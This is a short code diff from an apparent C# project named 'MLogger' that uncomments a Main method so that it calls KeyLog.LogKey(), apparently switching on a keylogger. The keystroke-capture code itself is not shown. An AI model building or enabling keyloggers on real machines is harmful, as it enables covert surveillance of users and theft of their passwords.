@@ -7,13 +7,9 @@ namespace MLogger
 {
     class Program
     {
-        /*
         public static void Main()
         {
             KeyLog.LogKey();
         }
-        */
-
-
     }
 }
